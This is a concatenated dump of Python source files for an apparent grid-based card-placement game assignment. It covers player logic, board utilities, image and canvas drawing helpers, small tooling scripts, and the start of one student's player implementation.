            UTILS.writeCard( newCardOnDesk[0], newCardOnDesk[1], newCardOnDesk[2], self.board )
    
        allExpands = self.expand()

        if len(allExpands) == 0:
            return []                
        maxCost = max( [ pos[2] for pos in allExpands ] )
        bestPositions = [ pos for pos in allExpands if pos[2] == maxCost ]
        cardsizes = [ len(pos[4])*len(pos[4][0]) for pos in bestPositions ]
        maxCardSize = max(cardsizes)
        bestPositions = [ pos for pos in bestPositions if len(pos[4])*len(pos[4][0]) == maxCardSize ]

        randomPlacement = random.sample(bestPositions, 1)[0]
                        
        row, col, cost, cardindex, card2d, _ = randomPlacement
        self.cardsOnDesk.append( [ row, col, card2d ] )
        self.isCardFree[ cardindex ] = False
        UTILS.writeCard( row, col, card2d, self.board )  
        return [ row, col, card2d ]


    def drawCards2(self, numRows, numCols, cards, filename, _cellWidth = 60, comps = {}, highlightCard = [], cardsInBW = False):
        """Debugging function, you can draw your cards in PNG file with it. Look at player.py for example
        """
        def getCenter(row, col):
            return row*_cellWidth + _cellWidth/2, col*_cellWidth + _cellWidth/2
        def bw(color):
            r = color.replace("#","")[0:2]            
            g = color.replace("#","")[2:4]            
            b = color.replace("#","")[4:]
            r = int(r,16)
            g = int(g,16)
            b = int(b,16)
            v = (r+g+b)//3
            v = hex(v).replace("0x","")
            v = "#{}{}{}".format(v,v,v)
            return v

        _cardOutline = "#CD853F"
        _cardOutlineHL = "#FFFF10"
        _gridColor = "#888888"
        _gridColor = "#ADACB5"
        _componentColor = "#FFFF00"
        _originColor = "#ff69b4"
        _originColor2 = "#f8c8dc"

        width = _cellWidth*numCols
        height = _cellWidth*numRows
        img = Image.new('RGBA',(width,height),"white")
        draw = ImageDraw.Draw(img)

        for card in cards:
            row, col, matrix = card
            cardRows = len(matrix)
            cardCols = len(matrix[0])
            eps = 3
            draw.rectangle([col*_cellWidth-eps, row*_cellWidth-eps, (col+cardCols)*_cellWidth+eps, (row+cardRows)*_cellWidth+eps], outline = _cardOutline, fill=(0,0,0,0), width=10)
            for r in range(cardRows):
                for c in range(cardCols):
                    cellRow = r + row
                    cellCol = c + col
                    value = matrix[r][c]
                    if value == 0:
                        value = -1
                    color = self._colors[ value ]
                    if cardsInBW and card != highlightCard:
                        color = bw(color) 
                    draw.rectangle([cellCol*_cellWidth, cellRow*_cellWidth, (cellCol+1)*_cellWidth, (cellRow+1)*_cellWidth], fill=color )
            eps = _cellWidth/6
            rc,cc = getCenter(row, col)                    
            draw.ellipse([cc-eps,rc-eps,cc+eps,rc+eps], fill=_originColor2)

        if len(highlightCard) == 3:
            row, col, card = highlightCard
            cardRows = len(card)
            cardCols = len(card[0])                    
            eps = 3
            pts = [ [0,0],[1,0],[1,1],[0,1],[0,0] ]
            pts = [ ( (col+p[0]*cardCols)*_cellWidth, (row+p[1]*cardRows)*_cellWidth) for p in pts ]
            draw.line(pts, fill=_cardOutlineHL, width=10)

        for cell in comps:
            eps = _cellWidth/10
            y1,x1 = getCenter(cell[0], cell[1])
            y2,x2 = getCenter(comps[cell][0], comps[cell][1])
            draw.line([x1,y1,x2,y2], fill=_componentColor, width=2)
            draw.ellipse([x1-eps,y1-eps,x1+eps,y1+eps], fill=_componentColor, width=2)
            draw.ellipse([x2-eps,y2-eps,x2+eps,y2+eps], fill=_componentColor, width=2)

        for i in range(1,numRows):
            draw.line([0,i*_cellWidth, width, i*_cellWidth ], fill = _gridColor, width = 2)
        for i in range(1,numCols):
            draw.line([i*_cellWidth,0,i*_cellWidth, height ], fill = _gridColor, width = 2)
        eps = 2
        draw.line([eps,eps,width-eps,eps,width-eps,height-eps,eps, height-eps, eps, eps], fill=_gridColor, width=5)    
        if "jpg" in filename:
            img = img.convert('RGB')                
        img.save(filename)

    def drawCards2_js(self, numRows, numCols, cards, filename, _cellWidth = 60, comps = {}, highlightCard = [], cardsInBW = False):
        
        def getCenter(row, col):
            return row*_cellWidth + _cellWidth/2, col*_cellWidth + _cellWidth/2
        def bw(color):
            r = color.replace("#","")[0:2]            
            g = color.replace("#","")[2:4]            
            b = color.replace("#","")[4:]
            r = int(r,16)
            g = int(g,16)
            b = int(b,16)
            v = (r+g+b)//3
            v = hex(v).replace("0x","")
            v = "#{}{}{}".format(v,v,v)
            return v
        def rectLines(x,y,width, height,color, thickness = 1):            
            pts = [ [0,0],[1,0],[1,1],[0,1],[0,0] ]
            pts = [  (x+width*p[0], y+height*p[1]) for p in pts ]
            res = ""
            for pi in range(len(pts)-1):
                res += "drawLine(ctx,{},{},{},{},\"{}\", {});\n".format(pts[pi][0], pts[pi][1], pts[pi+1][0], pts[pi+1][1], color, thickness)
            return res

        _cardOutline = "#CD853F"
        _cardOutline = "#0000aa"
        _cardOutlineHL = "#FFFF10"
        _cardOutlineHL = "#FF69b4"
        _gridColor = "#888888"
        _gridColor = "#ADACB5"
        _componentColor = "#FFFF00"
        _originColor = "#ff69b4"
        _originColor2 = "#f8c8dc"
        
        width = _cellWidth*numCols
        height = _cellWidth*numRows
#        img = Image.new('RGBA',(width,height),"white")
#        draw = ImageDraw.Draw(img)

        self._canvasid += 1
        out = "\n\n"
        out += "<canvas id=\"cnv{}\" width=\"{}\" height=\"{}\" style=\"border:1px solid #aaaaaa;\">Your browser does not support HTML5 canvas </canvas>\n".format(self._canvasid,width, height);
        out += "<script>"
        out += "function drawCanvas{}(name)".format(self._canvasid) + "{\n"
        out += "let canvas = document.getElementById(name);\n".format(self._canvasid)
        out += "let ctx = canvas.getContext('2d');\n"


        for card in cards:
            row, col, matrix = card
            cardRows = len(matrix)
            cardCols = len(matrix[0])
            eps = 3
#            draw.rectangle([col*_cellWidth-eps, row*_cellWidth-eps, (col+cardCols)*_cellWidth+eps, (row+cardRows)*_cellWidth+eps], outline = _cardOutline, fill=(0,0,0,0), width=10)
            rx = col*_cellWidth-eps
            ry = row*_cellWidth-eps
            wx = cardCols*_cellWidth
            wy = cardRows*_cellWidth
#            out += "ctx.lineWidth=10;\n";
#            out += "ctx.strokeStyle = '{}';\n".format(_cardOutline)
#            out += "ctx.strokeRect({},{},{},{});\n".format(rx,ry,wx,wy)
#            out += "ctx.lineWidth=1;\n";
            for r in range(cardRows):
                for c in range(cardCols):
                    cellRow = r + row
                    cellCol = c + col
                    value = matrix[r][c]
                    if value == 0:
                        value = -1
                    color = self._colors[ value ]
                    if cardsInBW and card != highlightCard:
                        color = bw(color) 
#                    draw.rectangle([cellCol*_cellWidth, cellRow*_cellWidth, (cellCol+1)*_cellWidth, (cellRow+1)*_cellWidth], fill=color )
                    rx = cellCol*_cellWidth
                    ry = cellRow*_cellWidth
                    wx = 1*_cellWidth
                    wy = 1*_cellWidth
                    out += "ctx.fillStyle='{}';\n".format(color)
                    out += "ctx.fillRect({},{},{},{});\n".format(rx,ry,wx,wy)
            eps = _cellWidth/6
            rc,cc = getCenter(row, col)                    
            out += "//origin\n"
            out += "drawCircle(ctx,{},{},{},\"{}\");\n".format(cc,rc,_cellWidth/6,_originColor2)
#            out += "ctx.beginPath();\n"
#            out += "ctx.fillStyle = '{}';\n".format(_originColor2)
#            out += "ctx.arc({},{},{},0,Math.PI*2);\n".format(cc,rc,_cellWidth/6)
#            out += "ctx.fill();\n"
#            draw.ellipse([cc-eps,rc-eps,cc+eps,rc+eps], fill=_originColor2)

        if len(highlightCard) == 3:
            row, col, card = highlightCard
            cardRows = len(card)
            cardCols = len(card[0])                    
            eps = 3
            pts = [ [0,0],[1,0],[1,1],[0,1],[0,0] ]
            pts = [ ( (col+p[0]*cardCols)*_cellWidth, (row+p[1]*cardRows)*_cellWidth) for p in pts ]
#            draw.line(pts, fill=_cardOutlineHL, width=10)
            out += "//HL card\n"
            out += rectLines(col*_cellWidth,row*_cellWidth, cardCols*_cellWidth, cardRows*_cellWidth, _cardOutlineHL, 5)
            out += "// end of HL\n";
#            for i in range(len(pts)-1):
#                out += "ctx.lineWidth = 3;\n";
#                out += "drawLine(ctx,{},{},{},{},\"{}\");\n".format(pts[i][0],pts[i][1], pts[i+1][0],pts[i+1][1], _cardOutlineHL)
#                out += "ctx.lineWidth = 1;\n";

           
        for cell in comps:
            eps = _cellWidth/10
            y1,x1 = getCenter(cell[0], cell[1])
            y2,x2 = getCenter(comps[cell][0], comps[cell][1])
#            draw.line([x1,y1,x2,y2], fill=_componentColor, width=2)
            out += "drawLine(ctx,{},{},{},{},\"{}\",1);\n".format(x1,y1,x2,y2, _componentColor)

            out += "// comps\n";
#            draw.ellipse([x1-eps,y1-eps,x1+eps,y1+eps], fill=_componentColor, width=2)
            out += "drawCircle(ctx, {},{}, {}, \"{}\");\n".format(x1,y1,_cellWidth/10,_componentColor)
#            draw.ellipse([x2-eps,y2-eps,x2+eps,y2+eps], fill=_componentColor, width=2)
            out += "drawCircle(ctx, {},{}, {}, \"{}\");\n".format(x2,y2,_cellWidth/10,_componentColor)
        
        for i in range(1,numRows):
#            draw.line([0,i*_cellWidth, width, i*_cellWidth ], fill = _gridColor, width = 2)
            out += "drawLine(ctx, {},{},{},{},\"{}\",1);\n".format(0,i*_cellWidth, width, i*_cellWidth, _gridColor)

        for i in range(1,numCols):
#            draw.line([i*_cellWidth,0,i*_cellWidth, height ], fill = _gridColor, width = 2)
            out += "drawLine(ctx, {},{},{},{},\"{}\",1);\n".format(i*_cellWidth,0, i*_cellWidth, height, _gridColor)
        out += "//card outlines\n"

        for card in cards:
            row, col, matrix = card
            cardRows = len(matrix)
            cardCols = len(matrix[0])
            rx = col*_cellWidth
            ry = row*_cellWidth
            wx = cardCols*_cellWidth
            wy = cardRows*_cellWidth
            out += rectLines(rx,ry, wx,wy, _cardOutline, 2)


        eps = 2
#        draw.line([eps,eps,width-eps,eps,width-eps,height-eps,eps, height-eps, eps, eps], fill=_gridColor, width=5)    
        _blackColor = "#000000"
        out += "drawLine(ctx,0,0,0,{}, \"{}\",6);\n".format(height, _blackColor)
        out += "drawLine(ctx,0,{},{},{},\"{}\",6);\n".format(height,width,height, _blackColor)
        out += "drawLine(ctx,{},{},{},0,\"{}\",6);\n".format(width,height,width, _blackColor)
        out += "drawLine(ctx,{},0,0,0,\"{}\",6);\n".format(width, _blackColor)
 
        out += "}\n\n"
        out += "drawCanvas{}(\"cnv{}\");\n".format(self._canvasid, self._canvasid)
        out += "</script>"
        return out




if __name__ == "__main__":
    tmp = [C44a, C44b, C33a,C33b, C33c]*1

    p1 = Player("testA", 19,23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        # UTILS.drawMatrix(p2.board, "move-{:02}-B.png".format(gameStep))
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


obf.py
import re, glob, os, sys, string, random

if len(sys.argv) != 2:
    print("usage", sys.argv[0], " <active 0/1>")
    quit()

isActive = int(sys.argv[1])


funs = {}
for fn in files:
    with open(fn,"rt") as f:
        for line in f:
            if line.find("def") == 0:
                res = re.search("def (\w*)\(.*\):", line)
#                print("L", line.strip(), res)
                if res and len(res.groups()) > 0:
                    fname = res.group(1)
#                    print(line, fname)
                    funs[ fname ] = 1

s = list(funs.keys())
s.sort()
#print(s)

funs = ['gameOfTwo', 'card2line', 'card2matrixString', 'card2png', 'cardSize', 'changeColor', 'checkOutput', 'checkTypes', 'drawMatrix', 'floodfill', 'getAllPlacements', 'getPlayerVersion', 'geta', 'getfn', 'handler', 'identifyCardComponents', 'inBoard', 'isCardTouching', 'isEmptyMatrix', 'isFreeInField', 'isFreeSpace', 'items2table', 'makeTest', 'png2base64', 'png2img', 'printBoard', 'printCard', 'printStatus', 'removeSecret', 'replaceBrackets', 'rfn', 'rotateCard', 'test1', 'toColor', 'toGreen', 'toName', 'toRed', 'value2str', 'writeCard', 'writeHTML', 'writePts', 'oneMove', 'showValidMode', 'showInvalidMove']

if isActive != 1:
    quit()


def randomfn():
    rl = random.randint(3,10)
    return ''.join( [ random.choice(string.ascii_letters) for _ in range(rl) ] )

codes2fn = {}
fun2code = {}
for function in funs:
    while True:
        code = randomfn()
        if not code in codes2fn:
            codes2fn[ code ] = function
            fun2code[ function ] = code
            break
print("Codes", fun2code)



for fn in files:
    f = open(fn,"rt")
    lines = f.readlines()
    f.close()
    f = open(fn,"wt")
    cnt = 0
    for line in lines:
        for function in funs:
            if line.find(function) >= 0:
                new = line.replace(function, fun2code[ function ] )
#                print(fn, ": replacing", line.strip(), "by", new.strip())
                line = new
                cnt += 1
        f.write(line)
    print("File", fn, " replaced", cnt)
    f.close()





pickleAll.py
import pickle, glob, os, zlib


files = glob.glob("out.*.p")
games = []
beforeCompression = 0
afterCompression = 0

outfile = "allGames.p"
try:
    os.unlink(outfile)
except:
    print("Cannot delete", outfile, "it does not exists")

for name in files:
    f = open(name,"rb")
    d = pickle.load(f)
    f.close()
    beforeCompression += len(d["html"])
    d["html"] = zlib.compress(d["html"].encode(),9)
    d["htmlCompressed"] = True
    afterCompression += len(d["html"])
    games.append(d)

if len(files) > 0:    
    fo = open(outfile,"wb")
    pickle.dump(games, fo)
    fo.close()

print("Saving", files, "into", outfile)
print("Before compression ", int(beforeCompression/ 1024), "k, after compression ", int(afterCompression/1024), "k ", sep="")
os.system("rm out.*.p")
         
removeComments.py
import tokenize, sys
if len(sys.argv) != 2:
    print("usage: ", sys.argv[0], " <inputile> ")
    quit()

filename = sys.argv[1]

outlines = ''
f = open(filename,"rt")

for toktype, tok, start, end, line in tokenize.generate_tokens(f.readline):
    if toktype != tokenize.COMMENT:
        outlines += " " + tok
f.close()    

print(outlines)    
utils.py

import copy, math, base64, io
from PIL import Image, ImageDraw

__all__=[]
def __dir__():
    return []


#variables for visualization
_colors = {}
_colors[-2] = "#eeeeff" #sunglow
_colors[-1] = "#cccccc" #sunglow
_colors[0] = "#ffffff" #white
_colors[1] = "#947bd3" #medium purple
_colors[2] = "#ff0000" #red
_colors[3] = "#00ff00" #green
_colors[4] = "#0000ff" #blue
_colors[5] = "#566246" #ebony
_colors[6] = "#a7c4c2" #opan
_colors[7] = "#ADACB5" #silver metalic
_colors[8] = "#8C705F" #liver chestnut
_colors[9] = "#FA7921" #pumpkin
_colors[10] = "#566E3D" #dark olive green

_colors[1] = "#636940"
_colors[2] = "#59A96A"
_colors[3] = "#ffdd4a"
_colors[4] = "#fe9000"
_colors[-2] = "#a3d9ff"

def cardSize(card):
    return len(card), len(card[0])

def inBoard(board, row, col):
    rows, cols = cardSize(board)
    return row >= 0 and row < rows and col >=0 and col < cols


def card2matrixString(card):
    line = ""
    for r in range(len(card)):
        for c in range(len(card[r])):
            line += "{} ".format(card[r][c])
        line += "\n"
    return line        

def card2png(card, filename):    
    crows, ccols = cardSize(card)
    matrix = [ [0]*ccols for _ in range(crows) ]
    writeCard(0,0,card, matrix)
    drawMatrix(matrix,filename)


def changeColor(card, oldColor, newColor):
    new = copy.deepcopy(card)
    for row in range(len(new)):
        for col in range(len(new[row])):
            if new[row][col] == oldColor:
                new[row][col] = newColor
    return new


def rotateCard(card):
    rows, cols = cardSize(card)
    newCard = [ [0]*rows for _ in range(cols) ]  #new card has switched rows and cols
    for r in range(rows):
        for c in range(cols):
            newCard[cols-1-c][r] = card[r][c]
    return newCard            


def card2line(card):
    line = ""
    for row in range(len(card)):
        for col in range(len(card[row])):
            if len(line) != 0:
                line += " "
            line += str(card[row][col])
    return line



def printCard(card):
    rows, cols = cardSize(card)
    for row in range(rows):
        for col in range(cols):
            print("{:3d}".format(card[row][col]), end=" ")
        print()



def isFreeSpace(board, row, col, numRows, numCols):
    if not inBoard(board,row, col):
        return False
    if not inBoard(board,row+numRows-1, col+numCols-1):
        return False

    for r in range(numRows):
        for c in range(numCols):
            if board[r+row][c+col] != 0:
                return False
    return True                

def isFreeInField(matrix, row, col, cardRows, cardCols, distanceField):
    if row + cardRows > len(matrix):
        return False

    for r in range(row, row + cardRows):
        if distanceField[r][col] < cardCols:
            return False
#    print("Is free", row, col, "TRUE")
#    printCard(distanceField)
    return True        

def isCardTouching(board, row, col, card):
    cardRows, cardCols = cardSize(card)
    for r in range(cardRows):
        cellRow = r + row
        cellCol = col - 1 #left neighbor
        if inBoard(board, cellRow, cellCol) and board[cellRow][cellCol] != 0:
            return True
        cellCol = cardCols + col #which is alredy right neighbor
        if inBoard(board, cellRow, cellCol) and board[cellRow][cellCol] != 0:
            return True
    for c in range(cardCols):
        cellCol = col + c
        cellRow = row-1
        if inBoard(board, cellRow, cellCol) and board[cellRow][cellCol] != 0:
            return True
        cellRow = row + cardRows #already bottom neighb
        if inBoard(board, cellRow, cellCol) and board[cellRow][cellCol] != 0:
            return True
    return False                


def writeCard(row, col, card, board, writeValue = None, backgroundValue = -1):
        cardRows = len(card)
        cardCols = len(card[0])
        if writeValue == None and not isFreeSpace(board, row, col, cardRows, cardCols):
            return False
            """
                print("Cannot place card", cardRows, "x", cardCols, " at ", row,col, " space is not free! ")
                print("Matrix size", cardSize(board))
                print("matrix:", board)
                a = 1/0
                quit()
            """
        for r in range(cardRows):
            for c in range(cardCols):
                val = card[r][c]
                if val == 0:
                    val = backgroundValue
                if writeValue != None:
                    val = writeValue
                board[r+row][c+col] = val
        return True

             
def isEmptyMatrix(matrix):                
    for row in range(len(matrix)):
        for col in range(len(matrix[row])):
            if matrix[row][col] != 0:
                return False
    return True            


def floodfill(matrix, startRow, startCol):
    #return list of explored cells and their parents
    colorToExplore = matrix[ startRow ][ startCol ]
    openList = [ [ startRow, startCol ] ]
    explored = {}
    neighbors = [ [-1,0],[1,0],[0,-1],[0,1] ]

    while len(openList):
        row, col = openList.pop()
        if not (row, col) in explored:
            explored[ (row, col) ] = ( row, col )

        for n in neighbors:
            newRow = row + n[0]
            newCol = col + n[1]
            if inBoard(matrix, newRow, newCol) and matrix[newRow][newCol] == colorToExplore:
                if not (newRow, newCol) in explored:
                    openList.append( [ newRow, newCol ] )
                    explored[ (newRow, newCol) ] = ( row, col ) #his parent
    return explored


def identifyCardComponents(card):
    cardRows, cardCols = cardSize(card)
    c2 = copy.deepcopy(card)

    colorComponents = {}
    while True:
        startRow = -1
        startCol = -1
        for r in range(cardRows):
            for c in range(cardCols):
                if c2[r][c] > 0:
                    startRow = r
                    startCol = c
                    break
            if startRow != -1:
                break                    
        if startRow == -1: #no unexplored was not found
            break               
        colorToExplore = c2[ startRow ][ startCol ]                
        if colorToExplore < 0:
            print("colorToExplore=",colorToExplore, " cannot be negative!")
            quit()

        positions = floodfill(c2, startRow, startCol)
        if len(positions) == 0:
            print("error in identifyCardComponents, list of component positions is 0")
            quit()

        for pos in positions:
            c2[ pos[0] ][ pos[1] ] *= -1  #1 -> -1, 2 -> -2 etc.., so its ignored by subsequent search
        if colorToExplore not in colorComponents:
            colorComponents[ colorToExplore ] = []

        colorComponents[ colorToExplore ].append( list(positions)[0] )
    return colorComponents


def getAllPlacements(matrix, card, getComponents = None, isFreeDict = None, isCardInTouchDict = None, distanceField = []):
    if isFreeDict == None:
        isFreeDict = {}
    if isCardInTouchDict == None:
        isCardInTouchDict = {}

    cardRows, cardCols = cardSize(card)
    isEmpty = isEmptyMatrix(matrix)
    res = []
    if isEmpty:
        for row in range(len(matrix)):
            for col in range(len(matrix[row])):
                if distanceField == []:
                    isFree = isFreeSpace(matrix, row, col, cardRows, cardCols)
                else:
                    isFree = isFreeInField(matrix, row, col, cardRows, cardCols, distanceField)
                if isFree:
                    res.append([ row, col, 0 ] )            
                    if getComponents != None:
                        getComponents.append( {} )
        return res
   
    colorComponents = identifyCardComponents(card)                  

    posValue = {}
    for color in colorComponents:
        for pos in colorComponents[color]:
            r = floodfill(card, pos[0], pos[1])
            posValue[ (pos[0], pos[1]) ] = len(r)

    for row in range(len(matrix)):
       for col in range(len(matrix[row])): 
            key = (row, col, cardRows, cardCols)
            if key in isFreeDict:
                isFree = isFreeDict[ key ]
            else:
                if distanceField == []:
                    isFree = isFreeSpace(matrix, row, col, cardRows, cardCols)
                else:
                    isFree = isFreeInField(matrix, row, col, cardRows, cardCols, distanceField)
                isFreeDict[ key ] = isFree
                if isFree: #also set true for all smaller cards
                    for rrr in range(2, cardRows):
                        for ccc in range(2, cardCols):
                            k = (row, col, rrr, ccc )
                            isFreeDict[ k ] = True

            if isFree:        
                key = (row, col, cardRows, cardCols)
                if key in isCardInTouchDict:
                    isTouch = isCardInTouchDict[ key ]
                else:
                    isTouch = isCardTouching(matrix, row, col, card)
                    isCardInTouchDict[ key ] = isTouch
                if isTouch:
                    #compute cost of adding
                    writeCard(row, col, card, matrix)
                    colorLengths = []
                    connectedCells = {}
                    for color in colorComponents:
                        for pos in colorComponents[color]:
                            r = floodfill(matrix, row+pos[0], col+pos[1])
                            if len(r) > posValue[ (pos[0], pos[1]) ]:
                                for cell in r:
                                    if not cell in connectedCells:
                                        connectedCells[ cell ] = r[cell]
                    writeCard(row, col, card, matrix, 0)
                    costOfAdding = len(connectedCells)
                    res.append([ row, col, costOfAdding] )
                    if getComponents != None:
                        getComponents.append( connectedCells )
    return res



def drawMatrix(board, filename, _cellWidth = 60, cards = [], components = {}):
        def cell2center(cell):
            return int(cell[0]*_cellWidth + _cellWidth/2), int(cell[1]*_cellWidth + _cellWidth/2)

        numRows = len(board)
        numCols = len(board[0])
        width = _cellWidth*numCols
        height = _cellWidth*numRows
        img = Image.new('RGB',(width,height),"white")
        draw = ImageDraw.Draw(img)
        _cardOutline = "#CD853F"
        _gridColor = "#888888"
        _gridColor = "#ADACB5"
        _componentColor = "#FFFF00"
        _originColor = "#ff69b4"
        _originColor2 = "#f8c8dc"
        for row in range(len(board)):
            for col in range(len(board[row])):
                value = board[row][col]
                if value != 0:
                    draw.rectangle([col*_cellWidth, row*_cellWidth, (col+1)*_cellWidth, (row+1)*_cellWidth], fill=_colors[ value ] )
        draw.line([0,0, width,0 ], fill = "#000000", width = 3)
        draw.line([0,height, width, height ], fill = "#000000", width = 3)

        draw.line([0,0, 0,height ], fill = "#000000", width = 3)
        draw.line([width,0, width,height ], fill = "#000000", width = 3)

        for i in range(1,numRows):
            draw.line([0,i*_cellWidth, width, i*_cellWidth ], fill = _gridColor, width = 2)
        for i in range(1,numCols):
            draw.line([i*_cellWidth,0,i*_cellWidth, height ], fill = _gridColor, width = 2)
   
        cellCircles = {} 
        for cell in components:
            r1,c1 = cell2center(cell)
            r2,c2 = cell2center(components[cell])
            draw.line([c1,r1,c2,r2], fill=_componentColor, width = 1)
            cellCircles[ (r1,c1) ] = True
            cellCircles[ (r2,c2) ] = True

        eps = _cellWidth/10
        for cell in cellCircles:
            draw.ellipse([ cell[1]-eps, cell[0]-eps, cell[1]+eps, cell[0]+eps], fill=_componentColor)

        eps = _cellWidth/5
        for cardpos in cards:
            row, col, card = cardpos
            cardRows, cardCols = cardSize(card)
            x1 = col*_cellWidth
            y1 = row*_cellWidth
            x2 = (col+cardCols)*_cellWidth
            y2 = (row+cardRows)*_cellWidth
            draw.line([x1,y1,  x2,y1,  x2,y2, x1,y2, x1,y1 ], fill = _cardOutline, width = 4)
            r1,c1 = cell2center([row, col])
            draw.ellipse([ c1-eps, r1-eps, c1+eps, r1+eps ], outline = _originColor, fill=_originColor2, width = 1 )


        img.save(filename)


def png2base64(filename, width = None):
    img = Image.open(filename)
    if width != None:
        w,h = img.size
        h2 = int((width/w)*h)
        print("Resizing image from", img.size, "to", width,h2)
        img = img.resize( (width, h2) )
        print("new size", img.size)

    buff = io.BytesIO()
    img.save(buff,format="PNG")
    buff.seek(0)
    datauri = base64.b64encode(buff.read()).decode("ascii")
    return datauri, img.size[0], img.size[1]


def png2img(filename, width):
#    uri,w,h = png2base64(filename, width = width)
    uri,w,h = png2base64(filename)
    height = int((width/w)*h)
    fstr = 'width="{}" height="{}" '.format(width, height)
    res = '<img {} src="data:image/png;base64,{}"/><br>'.format(fstr,uri)
    return res


def jpg2base64(filename):
    img = Image.open(filename)
    buff = io.BytesIO()
    img.save(buff,format="JPEG")
    buff.seek(0)
    datauri = base64.b64encode(buff.read()).decode("ascii")
    return datauri, img.size[0], img.size[1]


def jpg2img(filename, width):
    uri,w,h = jpg2base64(filename)
    height = int((width/w)*h)
    fstr = 'width="{}" height="{}" '.format(width, height)
    res = '<img {} src="data:image/jpeg;base64,{}"/><br>'.format(fstr,uri)
    return res









src-processed
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed______________________
    filajan1
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/filajan1______________________
        player.py
An error occurred: 'ascii' codec can't decode byte 0xc3 in position 729: ordinal not in range(128)    walledom
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/walledom______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw
def DebugPrint(grid):
    key = {-1:chr(11035), 0:chr(11036), 1:chr(128997), 2:chr(128999), 3:chr(129000), 4:chr(129001), 5:chr(129002), 6:chr(129003), 7:chr(128992), 8:chr(128993), 9:chr(128994), 10:chr(128995), 11:chr(128996)}
    for line in grid:
        for cell in line:
            print(key[cell], end="")
        print()
    print()
def try_fill_in_easy(x,y,karta,pole):
    vyska = len(karta)
    sirka = len(karta[0])
    for h in range(x,x+vyska):
        for k in range(y,y+sirka):
            if pole[h][k] != -1:
                return False
    if (x-1) > -1:
        tmp_x = x - 1
        for slouec in range(y,y+sirka):
            if pole[tmp_x][slouec] != -1:
                return True
    if (y-1) > -1:
        tmp_y = y - 1
        for radek in range(x,x+vyska):
            if pole[radek][tmp_y] != -1:
                return True
            
    if (x+vyska) < len(pole):
        tmp_x = x+vyska
        for sloupec in range(y,y+sirka):
            if pole[tmp_x][sloupec] != -1:
                return True
    
    if (y+sirka)<len(pole[0]):
        tmp_y = y + sirka
        for radek in range(x,x+vyska):
            if pole[radek][tmp_y] != -1:
                return True
    return False
                
def find_me_place_easy(karta,pole:list):
    #pole = do_2D_copy(hraci_pole)
    '''
    Vstup = 2D pole karty a 2D hraci pole
    Vystup = nejlepsi mozna zahratelna pozice
    '''
    #karta = do_2D_copy(origo_karta)
    for radky in range((len(pole)-len(karta)+1)):
        for sloupce in range((len(pole[0])-len(karta[0])+1)):
            if pole[radky][sloupce] == -1:
                fill_in = try_fill_in_easy(radky,sloupce,karta,pole)
                if fill_in:
                    return 0,radky,sloupce
    return -1,-1,-1


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

def vytvor_hraci_pole(radky,sloupce):
    '''
    Na vstupu dostane pole se dvema prvky a vrati 2D pole tvorene -1 o danem rozmeru
    '''   
    hraci_pole = []
    for i in range(radky):
        hraci_pole.append([-1]*sloupce)
    return hraci_pole

def rotate_card(pole:list):
    '''
    Vstup = 2D pole ktere chceme zrotovat
    Vystup = zrotovane 2D pole
    '''
    kopie = []
    for wtf in range(len(pole)):
        kopie.append(pole[wtf][:])
    rotace = []
    for i in range(len(kopie[0])):
        b = []
        for j in range(len(kopie)-1,-1,-1):
            b.append(kopie[j][i])
        rotace.append(b)
    return rotace

def karty_v_ruce(pole):
        karty_ruka = []
        for karta in pole:
            karty_ruka.append(karta)
            for j in range(3):
                rotace = rotate_card(karta)
                karty_ruka.append(rotace)
                karta = rotace
        return karty_ruka

def obsah_karet(pole):
        max_vyska = 0
        max_sirka = 0
        for karta in pole:
            vyska = len(karta)
            sirka = len(karta[0])
            if vyska > max_vyska:
                max_vyska = vyska
            if sirka > max_sirka:
                max_sirka = sirka
        return max_vyska,max_sirka

def try_fill_in(x,y,karta,pole):
    vyska = len(karta)
    sirka = len(karta[0])
    for h in range(x,x+vyska):
        for k in range(y,y+sirka):
            if pole[h][k] != -1:
                return False
    smery = ((1,0),(-1,0),(0,1),(0,-1))
    for smer in smery:
        if (smer[0] == -1) or (smer[1] == -1):
            if ((y+smer[1]) < 0) or ((x+smer[0]) < 0):
                    continue
            if smer[1] == -1:
                for rakdy_leva in range(x,x+vyska):
                    if pole[rakdy_leva][y-1] != -1:
                        return True
            else:
                for sloupce_nad in range(y,y+sirka):
                    if pole[x-1][sloupce_nad] != -1:
                        return True
                
        else:
            if ((y+sirka-1+smer[1]) == len(pole[0])) or ((x+vyska-1+smer[0]) == len(pole)):
                continue
            if smer[1] == 1:
                for rakdy_prava in range(x,x+vyska):
                    if pole[rakdy_prava][y+sirka] != -1:
                        return True
            else:
                for sloupce_pod in range(y,y+sirka):
                    if pole[x+vyska][sloupce_pod] != -1:
                        return True
    return False

def get_points(x,y,karta,pole):
    hraci_pole = copy.deepcopy(pole)
    
    opakovani = 0
    for i in range(x,(x + len(karta))):
        hraci_pole[i][y:(y + len(karta[0]))] = karta[opakovani]
        opakovani += 1
    
    jsem_v_karte = []
    for a in range(x,x + len(karta)):
        for b in range(y,y + len(karta[0])):
            jsem_v_karte.append([a,b])

    body = 0
    nechod = []
    magazine = []
    for radky in range(x,x+len(karta)):
        for sloupce in range(y,y + len(karta[0])):
            used = []
